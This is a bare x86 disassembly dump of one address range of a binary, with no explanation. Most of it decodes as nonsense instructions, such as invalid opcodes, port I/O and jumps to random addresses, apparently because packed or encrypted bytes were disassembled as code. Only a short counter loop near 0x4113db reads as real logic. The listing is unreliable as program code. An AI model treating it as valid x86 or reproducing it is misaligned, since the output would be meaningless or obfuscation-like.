  410f7d:	(bad)  
  410f7e:	ficomp WORD PTR [esi]
  410f80:	popf   
  410f81:	clc    
  410f82:	(bad)  
  410f83:	mov    ecx,0x30959dda
  410f88:	fsub   QWORD PTR [edx+0x6]
  410f8b:	xchg   esi,eax
  410f8c:	xchg   ebp,edi
  410f8e:	mov    bh,0x80
  410f90:	cmp    ecx,DWORD PTR [eax]
  410f92:	fld    TBYTE PTR [edi-0x1df05bdc]
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fe6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e21c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x79e2d93e]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x41103d
  410fdd:	sub    al,0xfe
  410fdf:	out    dx,eax
  410fe0:	cli    
  410fe1:	sti    
  410fe2:	mov    bl,0x9f
  410fe4:	xor    bl,BYTE PTR [edi+0x5ca950d0]
  410fea:	inc    edx
  410feb:	or     DWORD PTR ds:[ebx+edi*2+0x2d440db3],eax
  410ff3:	in     al,0xbc
  410ff5:	sub    DWORD PTR [edi+ecx*1-0xc],esi
  410ff9:	jns    0x410fcb
  410ffb:	mov    BYTE PTR [ebp+0x49a8cbb0],dh
  411001:	aad    0x1f
  411003:	int3   
  411004:	adc    ah,BYTE PTR [ebx-0x30]
  411007:	jne    0x410ffb
  411009:	push   edi
  41100a:	dec    edx
  41100b:	fwait
  41100c:	xchg   edi,eax
  41100d:	pusha  
  41100e:	idiv   BYTE PTR [esp+edx*4]
  411011:	inc    ebp
  411012:	hlt    
  411013:	sbb    ebx,esi
  411015:	pusha  
  411016:	ja     0x410fb8
  411018:	ja     0x411054
  41101a:	pop    es
  41101b:	mov    ebp,0xc24fe8b
  411020:	xor    DWORD PTR [ebx+0x46],ecx
  411023:	inc    ecx
  411024:	outs   dx,DWORD PTR ds:[esi]
  411025:	std    
  411026:	shl    DWORD PTR [esp+eiz*2-0x30],1
  41102a:	popa   
  41102b:	iret   
  41102c:	gs daa 
  41102e:	ds hlt 
  411030:	inc    ecx
  411031:	mov    cl,0x3e
  411033:	repz das 
  411035:	test   DWORD PTR [esi],eax
  411037:	loop   0x411053
  411039:	sub    ebp,edi
  41103b:	mov    eax,DWORD PTR [edi+0xefbeacf]
  411041:	jle    0x4110be
  411043:	in     al,dx
  411044:	push   ds
  411045:	pop    edi
  411046:	jl     0x41106d
  411048:	push   es
  411049:	ds dec eax
  41104b:	jb     0x4110bb
  41104d:	dec    eax
  41104e:	xchg   esi,eax
  41104f:	xchg   BYTE PTR [edi],ah
  411051:	jno    0x411040
  411053:	iret   
  411054:	mov    al,ah
  411056:	jg     0x4110ab
  411058:	js     0x410ff8
  41105a:	and    BYTE PTR [edx+eax*8-0x75],0xba
  41105f:	push   cs
  411060:	pop    esi
  411061:	popa   
  411062:	jg     0x41108a
  411064:	mov    al,ds:0xb5026cd1
  411069:	ins    DWORD PTR es:[edi],dx
  41106a:	jnp    0x4110b6
  41106c:	test   ebp,0x621bb180
  411072:	or     ebp,esi
  411074:	xor    eax,DWORD PTR [eax]
  411076:	aas    
  411077:	add    DWORD PTR [edi],edi
  411079:	cld    
  41107a:	stos   DWORD PTR es:[edi],eax
  41107b:	push   0xa7301a7d
  411080:	popa   
  411081:	out    dx,al
  411082:	sbb    ebp,DWORD PTR [edx+esi*1-0x2c]
  411086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411087:	jg     0x411014
  411089:	mov    dl,ch
  41108b:	or     DWORD PTR [ecx+0x7bd38f98],eax
  411091:	scas   al,BYTE PTR es:[edi]
  411092:	call   0x58d2:0xe47bd870
  411099:	jmp    0x4110a4
  41109b:	jge    0x4110c2
  41109d:	mov    esi,0xa221b731
  4110a2:	and    ah,al
  4110a4:	pusha  
  4110a5:	adc    eax,esi
  4110a7:	sub    edx,DWORD PTR [ebx]
  4110a9:	sbb    eax,0x974ef498
  4110ae:	xchg   BYTE PTR [ebx-0x58],bh
  4110b1:	mov    ah,0x11
  4110b3:	cli    
  4110b4:	xchg   esp,eax
  4110b5:	(bad)  
  4110b8:	sub    edi,DWORD PTR [ebp+0x2c6f10c]
  4110be:	out    dx,al
  4110bf:	cmp    al,0x27
  4110c1:	test   al,0x43
  4110c3:	pusha  
  4110c4:	mov    dh,0x33
  4110c6:	cmp    BYTE PTR [ebx+ebp*4-0x4d9f48d1],bh
  4110cd:	jmp    0x411110
  4110cf:	dec    esi
  4110d0:	sub    eax,0xd67faf7a
  4110d5:	add    ecx,DWORD PTR [edi]
  4110d7:	into   
  4110d8:	stos   DWORD PTR es:[edi],eax
  4110d9:	mov    eax,0x5ae511f5
  4110de:	nop
  4110df:	repz into 
  4110e1:	out    dx,eax
  4110e2:	sbb    al,0x22
  4110e4:	test   ah,al
  4110e6:	test   ah,cl
  4110e8:	xchg   ecx,eax
  4110e9:	fisubr DWORD PTR [ebp-0x3ce2b6c8]
  4110ef:	cmp    ecx,DWORD PTR [eax]
  4110f1:	sbb    eax,0xd11c2fb9
  4110f6:	mov    al,0x88
  4110f8:	mov    bl,al
  4110fa:	or     edi,DWORD PTR ss:[esi]
  4110fd:	sub    al,0x57
  4110ff:	jg     0x411106
  411101:	fidiv  DWORD PTR [ecx+0x56]
  411104:	(bad)  
  411105:	pusha  
  411106:	pusha  
  411107:	addr16 cwde 
  411109:	test   BYTE PTR [eax+0xc],bh
  41110c:	mov    DWORD PTR [esi+0x1655775b],esi
  411112:	loop   0x4110ee
  411114:	ja     0x411114
  411116:	push   edx
  411117:	fwait
  411118:	adc    al,0xd7
  41111a:	mov    esi,DWORD PTR [ebx-0x7fe08d29]
  411120:	lahf   
  411121:	or     ebx,DWORD PTR [eax]
  411123:	in     eax,dx
  411124:	nop
  411125:	data16 cs out dx,al
  411128:	sub    DWORD PTR [edi],esp
  41112a:	(bad)  
  41112b:	out    dx,eax
  41112c:	aaa    
  41112d:	jb     0x411107
  41112f:	popa   
  411130:	pop    ebx
  411131:	sub    cl,BYTE PTR [ebx+ebp*8+0x4fb850b2]
  411138:	lahf   
  411139:	scas   eax,DWORD PTR es:[edi]
  41113a:	push   0x77
  41113c:	sub    edx,eax
  41113e:	in     eax,0x69
  411140:	repnz inc esi
  411142:	arpl   WORD PTR [eax+edi*1],dx
  411145:	adc    eax,DWORD PTR [esi]
  411147:	ret    0x75bf
  41114a:	xor    eax,0xc9c8e396
  41114f:	(bad)  
  411150:	loope  0x411124
  411152:	add    ebx,edi
  411154:	push   ecx
  411155:	cmp    DWORD PTR [esi],esi
  411157:	dec    edi
  411158:	fldcw  WORD PTR [ecx+0x40]
  41115b:	shr    BYTE PTR [edi-0x76],cl
  41115e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41115f:	shl    DWORD PTR [ecx-0x55f3a0fd],1
  411165:	loop   0x411121
  411167:	push   ecx
  411168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41116a:	leave  
  41116b:	cmp    eax,0x8f494a45
  411170:	mov    ch,0x96
  411172:	or     eax,0x2fbc879a
  411177:	fnstenv ds:0x31e58d39
  41117d:	jl     0x41112c
  41117f:	in     al,dx
  411180:	push   edi
  411181:	out    dx,al
  411182:	(bad)  
  411183:	sub    bl,BYTE PTR [ebx]
  411185:	test   BYTE PTR [ecx],ch
  411187:	sti    
  411188:	ret    
  411189:	jge    0x4111a3
  41118b:	push   0x5026c2b6
  411190:	loopne 0x41116a
  411192:	or     eax,0xe7455fc6
  411197:	and    eax,0x61894d9b
  41119c:	pop    ds
  41119d:	mov    ebp,0x5d395f5c
  4111a2:	es pop es
  4111a4:	or     eax,0x1a81f5b6
  4111a9:	inc    DWORD PTR [ecx]
  4111ab:	(bad)  
  4111ad:	add    ecx,DWORD PTR [eax-0x51]
  4111b0:	enter  0x8a40,0x6
  4111b4:	pop    edx
  4111b5:	cs adc al,0xb6
  4111b8:	(bad)  
  4111b9:	fild   WORD PTR [ecx+0x0]
  4111bc:	jnp    0x41120b
  4111be:	mov    eax,es
  4111c0:	std    
  4111c1:	sub    al,dh
  4111c3:	mov    eax,0x446b4b26
  4111c8:	loopne 0x4111d5
  4111ca:	pop    eax
  4111cb:	pop    edx
  4111cc:	pop    esi
  4111cd:	mov    al,ds:0x30f42b57
  4111d2:	enter  0xbd1b,0x8d
  4111d6:	sbb    eax,0x37ff3363
  4111db:	aas    
  4111dc:	je     0x41117c
  4111de:	out    dx,al
  4111df:	loopne 0x41121c
  4111e1:	mov    DWORD PTR [ebx-0x7bd51c2e],esi
  4111e7:	mov    esi,DWORD PTR ds:0x4b3acb41
  4111ed:	out    dx,al
  4111ee:	push   ss
  4111ef:	inc    esi
  4111f0:	mov    ah,0xba
  4111f2:	push   ecx
  4111f3:	fstp   QWORD PTR [ecx+eax*8]
  4111f6:	mov    eax,ds:0xa6d00fe0
  4111fb:	(bad)  
  4111fc:	mov    eax,ds:0xc9db4a21
  411201:	pop    esp
  411202:	dec    eax
  411203:	mov    ecx,0xab37d02f
  411208:	out    0xf4,eax
  41120a:	jp     0x4111f1
  41120c:	aas    
  41120d:	jmp    0x1ba7:0x1ab77de2
  411214:	sar    DWORD PTR [ebx+esi*8+0x3172b3e5],0xf2
  41121c:	aaa    
  41121d:	mov    esi,0xfe64b60f
  411222:	cmc    
  411223:	sar    al,1
  411225:	dec    esp
  411226:	imul   ecx,DWORD PTR [edx-0x430b2a79],0xd65ec625
  411230:	lods   eax,DWORD PTR ds:[esi]
  411231:	pop    eax
  411232:	push   ss
  411233:	inc    ecx
  411234:	push   ss
  411235:	sbb    BYTE PTR [esi-0xd],bl
  411238:	adc    eax,0x73c04911
  41123d:	mov    BYTE PTR [edx+0xf],ch
  411240:	cwde   
  411241:	inc    esi
  411242:	lahf   
  411243:	xchg   ecx,eax
  411244:	add    eax,ecx
  411246:	pop    esi
  411247:	mov    ebp,0x3f95d45b
  41124c:	(bad)  
  41124d:	jmp    0x99c5504e
  411252:	add    al,0xac
  411254:	sahf   
  411255:	pop    esi
  411256:	jl     0x41123a
  411258:	and    eax,0x8b9286f8
  41125d:	xchg   edx,eax
  41125e:	xchg   ecx,eax
  41125f:	or     cl,BYTE PTR [edi+0x48]
  411262:	cwde   
  411263:	dec    ebp
  411264:	scas   al,BYTE PTR es:[edi]
  411265:	fldcw  WORD PTR [eax]
  411267:	loope  0x4112c7
  411269:	ds das 
  41126b:	gs rol al,0xdd
  41126f:	mov    ebp,0xd1fb8606
  411274:	(bad)  
  411275:	aaa    
  411276:	add    eax,0x2e394723
  41127b:	outs   dx,DWORD PTR ds:[esi]
  41127c:	mov    dl,0xcf
  41127e:	lods   eax,DWORD PTR ds:[esi]
  41127f:	adc    al,BYTE PTR [edi-0x21]
  411282:	push   ecx
  411283:	mov    ecx,0x415aa5f3
  411288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411289:	cmp    ch,ch
  41128b:	mov    ebp,0xf730f24d
  411290:	push   ss
  411291:	pop    eax
  411292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411293:	int    0x6f
  411295:	xor    DWORD PTR ds:0x3c28b1ab,0xffffffb3
  41129c:	jecxz  0x411227
  41129e:	pusha  
  41129f:	pop    ebx
  4112a0:	aas    
  4112a1:	std    
  4112a2:	and    eax,DWORD PTR [edx]
  4112a4:	outs   dx,BYTE PTR ds:[esi]
  4112a5:	push   ebp
  4112a6:	mov    bh,0x78
  4112a8:	push   esi
  4112a9:	xor    bl,bl
  4112ab:	sub    al,0x5b
  4112ad:	pop    eax
  4112af:	imul   ebp,DWORD PTR [ebx+0x37],0x2088df09
  4112b6:	ret    
  4112b7:	ja     0x41131d
  4112b9:	sub    edi,ecx
  4112bb:	dec    esp
  4112bc:	repnz (bad) 
  4112be:	inc    edx
  4112bf:	leave  
  4112c0:	sub    BYTE PTR [eax+edi*8+0x67],ch
  4112c4:	mov    ds:0xfa4cd8e,al
  4112c9:	dec    ecx
  4112ca:	xchg   cl,ah
  4112cc:	mov    ebx,DWORD PTR [edi]
  4112ce:	mov    bh,0xa2
  4112d0:	bound  esi,QWORD PTR ds:0xd22b3ab
  4112d7:	stos   BYTE PTR es:[edi],al
  4112d8:	dec    esi
  4112d9:	sub    BYTE PTR [esi-0xd7d8f66],ch
  4112df:	addr16 test eax,0x42583f24
  4112e5:	pop    edi
  4112e6:	inc    edi
  4112e7:	push   es
  4112e8:	cwde   
  4112e9:	push   0x75
  4112eb:	mov    al,ds:0x2704555e
  4112f0:	mov    ds:0xf1ffb1cb,al
  4112f6:	mov    WORD PTR [ecx-0x41b4c091],es
  4112fc:	pop    ss
  4112fd:	sti    
  4112fe:	out    dx,al
  4112ff:	pop    ecx
  411300:	mov    al,0x9d
  411302:	xchg   edx,eax
  411303:	mov    ds:0x7f972bcd,al
  411308:	sar    BYTE PTR [eax],cl
  41130a:	repnz ficomp WORD PTR [ecx-0x51]
  41130e:	cmc    
  41130f:	mov    DWORD PTR [esi-0x1f],edi
  411312:	sub    al,0x34
  411314:	adc    al,0x4e
  411316:	sbb    eax,0x7d2c1652
  41131b:	xchg   esp,eax
  41131c:	ins    DWORD PTR es:[edi],dx
  41131d:	inc    BYTE PTR [ebx+0x69c8b5a3]
  411323:	jl     0x41132d
  411325:	adc    eax,0xca9e47f3
  41132a:	(bad)  
  41132b:	pop    es
  41132c:	or     edx,DWORD PTR [esi+0x41]
  41132f:	stc    
  411330:	pop    esi
  411331:	mov    ds:0x592996a8,eax
  411336:	sti    
  411337:	xchg   edi,eax
  411338:	rol    DWORD PTR [edx],0x1c
  41133b:	jp     0x41135b
  41133d:	xchg   esp,eax
  41133e:	stos   BYTE PTR es:[edi],al
  41133f:	sbb    esp,DWORD PTR [esi-0xf158f39]
  411345:	jno    0x4112f3
  411347:	cmp    DWORD PTR [edi+0x1b],0xfffffff5
  41134b:	pop    ds
  41134c:	call   0x2c40d222
  411351:	adc    edi,esi
  411353:	mov    bl,BYTE PTR cs:[eax-0x7e]
  411357:	nop
  411358:	fwait
  411359:	pusha  
  41135a:	pop    esi
  41135b:	scas   al,BYTE PTR es:[edi]
  41135c:	scas   al,BYTE PTR es:[edi]
  41135d:	leave  
  41135e:	push   ss
  41135f:	mov    ecx,0x5b12b962
  411364:	sbb    al,0xb6
  411366:	pop    esp
  411367:	clc    
  411368:	ror    BYTE PTR [ecx],1
  41136a:	fcomp  DWORD PTR [esp+eax*4-0x75]
  41136e:	popa   
  41136f:	push   ds
  411370:	test   BYTE PTR [esi+0x1c47579a],bl
  411376:	jnp    0x411396
  411378:	sbb    ebx,DWORD PTR [eax+0x5f442298]
  41137e:	mov    ecx,0xf1ec732f
  411383:	adc    DWORD PTR ds:0xe4b2662d,ebp
  411389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41138a:	jmp    FWORD PTR [edx+0x14]
  41138d:	pop    esp
  41138e:	mov    bh,0x46
  411390:	dec    edx
  411391:	xor    esi,DWORD PTR [ebp+ebp*4-0x6516d1c9]
  411398:	dec    esi
  411399:	stos   DWORD PTR es:[edi],eax
  41139a:	inc    esi
  41139b:	imul   ebp,DWORD PTR [ebx-0x31068040],0x5896a236
  4113a5:	push   0x68
  4113a7:	inc    esp
  4113a8:	ja     0x4113e2
  4113aa:	dec    esi
  4113ab:	push   ss
  4113ac:	xchg   ebx,eax
  4113ad:	test   DWORD PTR ds:0xd9ff6939,0x1c9890ea
  4113b7:	xor    edx,DWORD PTR [edi+0x4b]
  4113ba:	and    edx,edi
  4113bc:	dec    BYTE PTR [edx+0xa41764e]
  4113c2:	daa    
  4113c3:	sub    eax,0x5c7c63b
  4113c8:	icebp  
  4113c9:	std    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fe7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fe7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fe7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fe7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e2e7
  411404:	push   0x42e36d
  411409:	call   DWORD PTR ds:0x42e667
  41140f:	cmp    DWORD PTR ds:0x42fe7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fe7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fe7a,esi
  411429:	cmp    DWORD PTR ds:0x42fe7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	pop    esp
  411448:	cmp    eax,0x4a0e248c
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x41147e
  411454:	xor    ebp,DWORD PTR [ebx+0x71]
  411457:	retf   0x38fb
  41145a:	rol    DWORD PTR [edx],cl
  41145c:	inc    DWORD PTR [edx-0x20]
  41145f:	jl     0x41149a
  411461:	mov    BYTE PTR [ebx-0x30],ch
  411464:	inc    esi
  411465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411466:	cs dec esi
  411468:	inc    esp
  411469:	mov    dh,0xad
  41146b:	nop
  41146c:	std    
  41146d:	retf   
  41146e:	das    
  41146f:	data16 cmp BYTE PTR [ecx-0x628a3a06],dl
  411476:	push   esp
  411477:	shr    DWORD PTR [ebx],0x81
  41147a:	mov    cl,0x91
  41147c:	into   
  41147d:	mov    ebx,0xe72c6a12
  411482:	out    dx,eax
  411483:	jmp    0xe9b2:0x9ec8d09a
  41148a:	lock std 
  41148c:	mov    eax,ds:0x174d7c80
  411491:	mov    gs,WORD PTR [esi]
  411493:	dec    ecx
  411494:	mov    ah,0xfa
  411496:	je     0x4114fa
  411498:	mov    bl,ch
  41149a:	shl    edx,cl
  41149c:	fstp   QWORD PTR [eax+0x57]
  41149f:	mov    esp,0xe591e508
  4114a4:	xor    edx,esp
  4114a6:	mov    bh,0x88
  4114a8:	add    al,0xe2
  4114aa:	pop    es
  4114ab:	idiv   BYTE PTR ds:0xd2215ee3
  4114b1:	mov    ch,0x8d
  4114b3:	retf   
  4114b4:	xor    eax,0x31b3e9bc
  4114b9:	sbb    al,0x11
  4114bb:	jae    0x41148b
  4114bd:	mov    bh,0xa7
  4114bf:	mov    dl,cl
  4114c1:	jbe    0x41144b
  4114c3:	jne    0x411531
  4114c5:	mov    ds:0x6b31d0a,al
  4114ca:	xor    eax,0x54b8b977
  4114cf:	js     0x411492
  4114d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114d2:	f2xm1  
  4114d4:	bound  esp,QWORD PTR ds:0x2a66497d
  4114da:	test   ebp,0x370facd
  4114e0:	pop    ss
  4114e1:	push   ds
  4114e2:	in     al,0x6a
  4114e4:	pop    ebp
  4114e5:	push   ds
  4114e6:	je     0x4114ac
  4114e8:	push   esi
  4114e9:	mov    bl,0x27
  4114eb:	jle    0x4114c2
  4114ed:	mov    ch,0x9f
  4114ef:	sbb    eax,0xb035bddf
  4114f4:	pmovmskb esp,mm4
  4114f7:	push   cs
  4114f8:	adc    al,0x33
  4114fa:	inc    eax
  4114fb:	sub    BYTE PTR [edi],bh
  4114fd:	pop    ebp
  4114fe:	push   eax
  4114ff:	mov    al,dh
  411501:	xchg   BYTE PTR [ebp-0x6e],bh
  411504:	sub    BYTE PTR [edi-0x72],dl
  411507:	push   ss
  411508:	lea    ebp,[edi+0x64]
  41150b:	pop    edi
  41150c:	outs   dx,DWORD PTR ds:[esi]
  41150d:	mov    bl,0xdb
  41150f:	fimul  WORD PTR [edi+0x66]
  411512:	push   edx
  411513:	add    edx,DWORD PTR [ecx]
  411515:	or     eax,0x92b3f306
  41151a:	clc    
  41151b:	dec    ebx
  41151c:	call   0xf526d21f
  411521:	aad    0xe6
  411523:	cmp    eax,0x9d4bf657
  411528:	mov    al,0xa4
  41152a:	xchg   ecx,eax
  41152b:	in     eax,0xf2
  41152d:	fisubr WORD PTR [edi-0x68]
  411530:	inc    ecx
  411531:	sub    ebp,0xe8862ff4
  411537:	ret    
  411538:	push   ss
  411539:	aas    
  41153a:	push   ebp
  41153b:	inc    edi
  41153c:	pop    esp
  41153d:	sbb    edi,ecx
  41153f:	test   DWORD PTR [ebx+0x1b],0x16c98f3b
  411546:	pop    edx
  411547:	test   bh,bl
  411549:	adc    cl,BYTE PTR [edi+0x76]
  41154c:	pop    edi
  41154d:	add    eax,0x28d9a9d0
  411552:	jmp    0x94b8b75
  411557:	sub    eax,ecx
  411559:	dec    esi
  41155a:	push   esi
  41155b:	es or  eax,0xf5230590
  411561:	fcomp  st(4)
  411563:	stc    
  411564:	lods   eax,DWORD PTR ds:[esi]
  411565:	jns    0x411578
  411567:	nop
  411568:	dec    ecx
  411569:	cwde   
  41156a:	or     BYTE PTR [ebp-0x1a0477d1],bh
  411570:	pop    ebx
  411571:	mov    ch,0x11
  411573:	or     eax,0xa6f663a6
  411578:	(bad)  
  411579:	mov    edx,0xb3d5ebf3
  41157e:	(bad)  
  41157f:	ins    DWORD PTR es:[edi],dx
  411580:	push   ds
  411581:	cmp    bl,BYTE PTR [edx-0x2b]
  411584:	ss scas al,BYTE PTR es:[edi]
  411586:	push   edi
  411587:	sti    
  411588:	cs nop
  41158a:	push   ds
  41158b:	sub    al,0x84
  41158d:	call   0x7fc9:0x963ca69e
  411594:	jno    0x4115b9
  411596:	mov    ecx,0xbb782d8d
  41159b:	mul    ebp
  41159d:	sub    ebp,ebx
  41159f:	adc    ah,0xe2
  4115a2:	push   esp
  4115a3:	cmp    al,0x7b
  4115a5:	xor    esi,DWORD PTR [edx]
  4115a7:	shl    BYTE PTR ss:[eax+eax*2],1
  4115ab:	les    esp,FWORD PTR [esi+0x357d58f8]
  4115b1:	in     eax,dx
  4115b2:	jmp    0x216c8cc6
  4115b7:	push   esi
  4115b8:	shl    DWORD PTR [ebx-0x7d],1
  4115bb:	test   al,0x75
  4115bd:	(bad)  
  4115be:	xor    eax,0xa361337b
  4115c3:	sbb    eax,0xa12aae8f
  4115c8:	sbb    dl,BYTE PTR [edx]
  4115ca:	call   0x47eb:0xb5e23b10
  4115d1:	bound  esp,QWORD PTR [edx]
  4115d3:	lods   eax,DWORD PTR ds:[esi]
  4115d4:	imul   ecx
  4115d6:	xor    DWORD PTR [esi],edi
  4115d8:	mov    eax,0xefa053f4
  4115dd:	or     al,ah
  4115df:	aas    
  4115e0:	jo     0x411644
  4115e2:	in     al,0xaf
  4115e4:	outs   dx,BYTE PTR ds:[esi]
  4115e5:	aam    0x9b
  4115e7:	mov    ds:0x5a4afe1c,eax
  4115ec:	into   
  4115ed:	add    al,0x49
  4115ef:	cmp    ch,BYTE PTR [ecx-0x54f30e57]
  4115f5:	xchg   edi,eax
  4115f6:	xor    eax,0x9bdeea92
  4115fb:	out    0x65,al
  4115fd:	sbb    edx,0x5
  411600:	jbe    0x4115cf
  411602:	xrstors [esi-0x20112959]
  411609:	push   ds
  41160a:	mov    ch,0x8d
  41160c:	xchg   edx,eax
  41160d:	sub    eax,0xc1b85ef3
  411612:	mov    di,0xdfb6
  411616:	test   bh,dl
  411618:	fld    TBYTE PTR [ebp+0x22]
  41161b:	mov    BYTE PTR [ecx+0x1e],0xb4
  41161f:	sub    ebp,DWORD PTR [ebp*2-0x651357e0]
  411626:	adc    DWORD PTR [esi+0x4c],edx
  411629:	out    dx,al
  41162a:	dec    eax
  41162b:	fldcw  WORD PTR [edi-0x7dad556f]
  411631:	cmp    esi,DWORD PTR [eax+edi*4+0x2]
  411635:	xchg   edx,eax
  411636:	adc    al,0x73
  411638:	cdq    
  411639:	ret    
  41163a:	mov    ebp,0xafd34528
  41163f:	mov    ch,0xa1
  411641:	mov    edx,0x8a38db22
  411646:	xor    edx,edx
  411648:	leave  
  411649:	xor    ch,BYTE PTR [eax]
  41164b:	aaa    
  41164c:	sbb    al,0x18
  41164e:	mov    edx,0x8121e4c2
  411653:	mov    cl,0x95
  411655:	jge    0x41168c
  411657:	pop    ds
  411658:	sub    al,0x25
  41165a:	shl    BYTE PTR [ebp+eax*1-0x52b7b31e],1
  411661:	es jg  0x41168b
  411664:	(bad)  
  411665:	sar    cl,1
  411667:	and    edx,DWORD PTR [edi]
  411669:	sahf   
  41166a:	or     edi,DWORD PTR [ebx+eiz*2-0x5e]
  41166e:	push   ebp
  41166f:	in     al,0x7a
  411671:	jecxz  0x411662
  411673:	mov    al,0x38
  411675:	mov    ebp,0x9da04db1
  41167a:	jo     0x411615
  41167c:	jae    0x41160f
  41167e:	iret   
  41167f:	int3   
  411680:	das    
  411681:	shl    BYTE PTR [eax-0x21],cl
  411684:	pop    ebp
  411685:	jmp    0xcfa430ae
  41168a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41168b:	outs   dx,BYTE PTR ds:[esi]
  41168c:	inc    esi
  41168d:	pop    ebp
  41168e:	or     al,0x3b
  411690:	sub    eax,DWORD PTR [edx-0x41]
  411693:	pop    ss
  411694:	lods   eax,DWORD PTR ds:[esi]
  411695:	test   DWORD PTR [esi+0x1d],ebx
  411698:	leave  
  411699:	loop   0x411682
  41169b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41169c:	jmp    0x411663
  41169e:	ret    
  41169f:	fdiv   DWORD PTR [edx]
  4116a1:	inc    esi
  4116a2:	or     ah,cl
  4116a4:	add    ebx,DWORD PTR ds:0x95ef84a2
  4116aa:	call   0x6d4e:0xf2cb9d14
  4116b1:	js     0x4116fa
  4116b3:	aad    0xea
  4116b5:	dec    edx
  4116b6:	dec    ebx
  4116b7:	out    dx,al
  4116b8:	inc    esi
  4116b9:	aas    
  4116ba:	xchg   esp,eax
  4116bb:	bound  esp,QWORD PTR [ecx-0x2b]
  4116be:	push   ecx
  4116bf:	mov    es,WORD PTR [esi+0x370e5bcf]
  4116c5:	jge    0x41170d
  4116c7:	adc    edi,DWORD PTR [eax]
  4116c9:	rdpmc  
  4116cb:	nop
  4116cc:	outs   dx,BYTE PTR ds:[esi]
  4116cd:	add    al,0x47
  4116cf:	arpl   di,dx
  4116d1:	mov    bl,0x3f
  4116d3:	inc    ebx
  4116d4:	mov    esi,0xc8c9ce8d
  4116d9:	jbe    0x4116c6
  4116db:	es call 0xfdfd:0xa459cebd
  4116e3:	pop    ss
  4116e4:	xor    al,BYTE PTR [di+0x1917]
  4116e9:	xchg   edi,eax
  4116ea:	rol    BYTE PTR [esi],0x12
  4116ed:	push   ds
  4116ee:	out    0x96,al
  4116f0:	jle    0x41172b
  4116f2:	xor    al,0x49
  4116f4:	stos   DWORD PTR es:[edi],eax
  4116f5:	push   0xf862d351
  4116fa:	adc    al,0x17
  4116fc:	or     cl,bl
  4116fe:	into   
  4116ff:	test   BYTE PTR [edi+0x1b531355],dh
  411705:	mov    BYTE PTR [ebp+0xb6ba55c],bl
  41170b:	(bad)  
  41170c:	lock popf 
  41170e:	add    dh,BYTE PTR [edx-0xe]
  411711:	mov    ?,WORD PTR [ecx]
  411713:	or     BYTE PTR [esi-0xc],ah
  411716:	add    esp,ecx
  411718:	jno    0x411795
  41171a:	cmc    
  41171b:	gs loope 0x411759
  41171e:	ret    
  41171f:	jle    0x411721
  411721:	daa    
  411722:	test   eax,0x7b1697cd
  411727:	dec    ebp
  411728:	jge    0x411720
  41172a:	test   al,0xb4
  41172c:	das    
  41172d:	jl     0x4116f4
  41172f:	mov    ecx,0x975acc0a
  411734:	push   esp
  411735:	test   al,0x9a
  411737:	dec    ecx
  411738:	mov    al,0x1a
  41173a:	cmp    ecx,0xffffffb6
  41173d:	push   0x243cce1b
  411742:	xchg   esp,eax
  411743:	pusha  
  411744:	jmp    0x8c3d:0x6a630005
  41174b:	rcl    BYTE PTR [esi-0xbec5426],1
  411751:	inc    edi
  411752:	iret   
  411753:	sub    BYTE PTR [edx],bl
  411755:	pop    ds
  411756:	add    al,0xd
  411758:	js     0x4117b8
  41175a:	or     al,0xc4
  41175c:	lock scas eax,DWORD PTR es:[edi]
  41175e:	fisubr DWORD PTR [edi-0x42823f4]
  411764:	mov    ch,0xa8
  411766:	sbb    ebp,DWORD PTR [edx-0x7d9b7632]
  41176c:	shr    BYTE PTR [eax-0x5712fd89],0x9f
  411773:	push   ebx
  411774:	clc    
  411775:	hlt    
  411776:	imul   esi,eax,0xdbc12a2e
  41177c:	adc    eax,0x6d2198fa
  411781:	inc    edi
  411782:	add    al,0x78
  411784:	xchg   esi,eax
  411785:	xchg   ebx,eax
  411786:	(bad)  
  411787:	pop    ebx
  411788:	js     0x4117ea
  41178a:	inc    ecx
  41178b:	(bad)  
  41178c:	popa   
  41178d:	iret   
  41178e:	mov    WORD PTR [ebx],ss
  411790:	mov    ebx,0x4e769aef
  411795:	fld    QWORD PTR [edi-0x27]
  411798:	dec    eax
  411799:	and    BYTE PTR [eax],cl
  41179b:	retf   
  41179c:	dec    ebp
